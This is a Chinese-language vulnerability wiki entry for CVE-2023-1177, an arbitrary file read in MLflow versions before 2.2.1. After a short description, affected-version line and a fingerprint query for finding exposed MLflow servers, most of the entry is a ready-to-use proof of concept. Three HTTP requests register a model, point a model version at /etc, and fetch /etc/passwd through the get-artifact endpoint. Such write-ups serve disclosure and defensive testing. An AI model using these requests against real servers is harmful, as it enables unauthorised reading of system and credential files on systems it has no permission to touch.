# MLflow get-artifact 任意文件读取漏洞 CVE-2023-1177

## 漏洞描述

使用 MLflow 模型注册表托管 MLflow 开源项目的用户 mlflow server或者 mlflow ui使用早于 MLflow 2.2.1 的 MLflow 版本的命令如果不限制谁可以查询其服务器（例如，通过使用云 VPC、入站请求的 IP 白名单或身份验证 /授权中间件）。

此问题仅影响运行 mlflow server和 mlflow ui命令。 不使用的集成 mlflow server或者 mlflow ui不受影响； 例如，Azure Machine Learning 上的 Databricks Managed MLflow 产品和 MLflow 不使用这些命令，并且不会以任何方式受到这些漏洞的影响。

## 漏洞影响

<a-checkbox checked>MLflow < 2.2.1</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app.name="MLflow"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](/assets/PeiQi-Wiki/img/1680785392550-723bb58a-8fb1-49ca-afd7-9faa9841b7ca.png)

验证POC

```plain
POST /ajax-api/2.0/mlflow/registered-models/create
Content-Type: application/json

{"name": "testfile"}
```

![img](/assets/PeiQi-Wiki/img/1680785555309-bc13e99b-784d-46aa-9b93-b3ca28ff457e.png)

```plain
POST /ajax-api/2.0/mlflow/model-versions/create
Content-Type: application/json

{"name": "testfile", "source": "/etc"}
```

![img](/assets/PeiQi-Wiki/img/1680785596505-b26cf5f7-10c6-4202-83f7-d5ccd71a797f.png)

```plain
/model-versions/get-artifact?path=passwd&name=testfile&version=1
```

![img](/assets/PeiQi-Wiki/img/1680785731521-49f79166-61c1-4e98-9cef-461227256df9.png)